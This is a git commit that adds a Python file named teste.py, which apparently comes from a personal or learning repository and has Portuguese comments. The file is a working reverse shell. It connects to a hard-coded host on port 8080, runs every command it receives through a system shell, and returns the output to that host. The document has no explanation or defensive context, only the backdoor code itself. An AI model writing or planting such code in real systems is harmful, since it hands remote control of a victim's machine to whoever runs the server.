c8866969b79e3ee4cd5fa7dcea807c1da9fe1905
Mrlucas5550100 <88862782+Mrlucas5550100@users.noreply.github.com>
2023-05-17 11:26:47 -0300

    Create teste.py

---
+++ teste.py
@@ -0,0 +1,23 @@
+import socket
+import subprocess
+
+HOST = '192.168.3.31'  # Endereço IP do servidor
+PORT = 8080        # Porta para se conectar
+
+# Crie um socket TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+# Receba comandos do servidor e execute-os
+while True:
+    command = s.recv(1024).decode()
+    if 'exit' in command:
+        break
+    else:
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes, 'utf-8')
+        s.send(output_str.encode())
+
+# Feche a conexão
+s.close()
